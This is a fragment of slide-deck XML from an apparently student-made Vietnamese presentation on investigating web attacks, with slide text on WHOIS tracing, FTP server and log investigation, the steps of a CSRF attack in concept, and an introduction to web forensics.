              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;175;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="5051025"/>
            <a:ext cx="9387000" cy="1400700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="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Công cụ WHOIS quan trọng vì nó được sử dụng để xác định chủ sở hữu của một trang web.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Nó cung cấp thông tin phong phú về một miền, bao gồm địa chỉ vật lý, số điện thoại, email liên hệ của quản trị viên và các máy chủ tên miền của hệ thống.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Nó hỗ trợ việc truy vết bằng cách cung cấp thông tin liên lạc tức thì để báo cáo các vấn đề hoặc xác định mạng nguồn của các hành vi xâm nhập </a:t>
            </a:r>
            <a:endParaRPr sz="13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79"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="180" name="Google Shape;180;p20" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="504825" y="1499800"/>
            <a:ext cx="11030100" cy="4962375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Google Shape;181;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="1729150"/>
            <a:ext cx="90954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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Điều tra máy chủ FTP sau khi xâm nhập: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Google Shape;182;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1592525" y="2259400"/>
            <a:ext cx="8597400" cy="1472400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="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Đảm bảo nhật ký không bị sửa đổi sau khi ghi bằng cách chuyển nhật ký ra khỏi máy chủ Web.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Kiểm tra các cài đặt hệ thống tệp vì cài đặt sai có thể cho phép truy cập không hạn chế vào tài nguyên máy chủ.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Cập nhật liên tục các bản vá lỗi cho hệ điều hành và gỡ bỏ các dịch vụ không cần thiết khác ngoài FTP.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Sử dụng danh sách kiểm soát truy cập (ACL) để hạn chế lưu lượng từ mạng nội bộ đến máy chủ FT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="183" name="Google Shape;183;p20"/>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III. Trả lời câu hỏi Chapter 3 - Investigating Web Attacks</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184" name="Google Shape;184;p20"/>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85" name="Google Shape;185;p20" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="1700212"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="186" name="Google Shape;186;p20" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="3864937"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="187" name="Google Shape;187;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="3893875"/>
            <a:ext cx="83523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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cách điều tra nhật ký FTP và máy chủ FTP: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="188" name="Google Shape;188;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1648000" y="4557625"/>
            <a:ext cx="8352300" cy="1400700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="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Nhật ký FTP: Sử dụng Task Scheduler để lên lịch các lần truy cập giả nhằm xác định xem cơ chế ghi nhật ký có hoạt động bình thường hay không (nếu nhật ký trống, có thể nó đã bị xóa).</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Máy chủ FTP: Thực hiện các biện pháp phòng thủ như bảo vệ hệ thống tệp của máy chủ, cách ly các thư mục FTP, thiết lập quy tắc xác thực và kiểm soát truy cập (username, mật khẩu, SSL), đồng thời thường xuyên xem xét nhật ký và nội dung thư mục để phát hiện các tệp hoặc hành vi sử dụng trái phé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>p</a:t>
            </a:r>
            <a:endParaRPr sz="11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92"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="193" name="Google Shape;193;p21" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="495150" y="1499800"/>
            <a:ext cx="11030100" cy="4962375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="194" name="Google Shape;194;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="1729150"/>
            <a:ext cx="90954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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cấu trúc của một cuộc tấn công CSRF: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="195" name="Google Shape;195;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="2711125"/>
            <a:ext cx="4270800" cy="2901600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="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Kẻ tấn công lưu trữ một trang Web có biểu mẫu (form) trông có vẻ hợp lệ nhưng đã chứa sẵn yêu cầu của kẻ tấn công.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Người dùng tin rằng biểu mẫu này là bản gốc và nhập tên đăng nhập cùng mật khẩu.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="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Sau khi người dùng hoàn tất, trang đó sẽ được gửi đến trang web thực.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150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Máy chủ của trang web thực chấp nhận biểu mẫu đó vì cho rằng nó được gửi bởi người dùng dựa trên thông tin xác thực</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="196" name="Google Shape;196;p21"/>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III. Trả lời câu hỏi Chapter 3 - Investigating Web Attacks</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="197" name="Google Shape;197;p21"/>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98" name="Google Shape;198;p21" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="1700212"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Google Shape;199;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1068275" y="2312750"/>
            <a:ext cx="8352300" cy="231000"/>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800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Có 4 bước:</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="200" name="Google Shape;200;p21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6094625" y="2387150"/>
            <a:ext cx="5183476" cy="2822625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201" name="Google Shape;201;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5983625" y="5487125"/>
            <a:ext cx="5294400" cy="5772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800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Nguồn: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:uFill>
                  <a:noFill/>
                </a:u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Tấn Công CSRF: Nguyên lý, Kỹ Thuật &amp; Phòng Ngừa Hiệu Quả - AZ WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="lt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05"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="206" name="Google Shape;206;p22" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="504825" y="1499800"/>
            <a:ext cx="11030100" cy="4962375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="Google Shape;207;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="1729150"/>
            <a:ext cx="90954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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Khoa học điều tra số và phản ứng sự cố (DFIR): </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="Google Shape;208;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="975800" y="2162025"/>
            <a:ext cx="9806100" cy="2425200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="457200" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Điều</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tra</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số</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trong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môi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trường</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> web (Web Forensics) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>là</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một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nhánh</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của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> Khoa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>học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Điều</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tra</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số</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tập</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trung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vào</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việc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tìm</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kiếm</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thu</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thập</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bảo</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quản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và</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phân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tích</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các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bằng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chứng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số</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để</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dựng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lại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kịch</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bản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của</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một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cuộc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tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> web.</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="457200" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Theo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>tiêu</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chuẩn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> ISO/IEC 27037 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>và</a:t>
            </a:r>
            <a:r>
